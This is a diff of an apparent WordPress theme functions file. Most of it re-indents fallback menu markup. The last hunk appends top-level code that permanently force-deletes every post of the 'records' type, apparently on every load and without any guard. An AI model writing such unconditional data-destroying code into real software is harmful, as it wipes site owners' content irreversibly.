@@ -81,15 +81,21 @@ function pagination($pages = '', $range = 4)
   }
 
 function fallbackmenu1(){ ?>
-			<div id="menu">
-				<ul><li> Go to Adminpanel > Appearance > Menus to create your menu. You should have WP 3.0+ version for custom menus to work.</li></ul>
-			</div>
+<div id="menu">
+    <ul>
+        <li> Go to Adminpanel > Appearance > Menus to create your menu. You should have WP 3.0+ version for custom menus
+            to work.</li>
+    </ul>
+</div>
 <?php }
 
 function fallbackmenu2(){ ?>
-			<div id="menu">
-				<ul><li> Go to Adminpanel > Appearance > Menus to create your menu. You should have WP 3.0+ version for custom menus to work.</li></ul>
-			</div>
+<div id="menu">
+    <ul>
+        <li> Go to Adminpanel > Appearance > Menus to create your menu. You should have WP 3.0+ version for custom menus
+            to work.</li>
+    </ul>
+</div>
 <?php }
 
 function add_more_buttons($buttons) {
@@ -261,4 +267,7 @@ function Is_Token_Expired() {
 
 
 
-
+        $allposts= get_posts( array('post_type'=>'records','numberposts'=>-1) );
+        foreach ($allposts as $eachpost) {
+        wp_delete_post( $eachpost->ID, true );
+        }
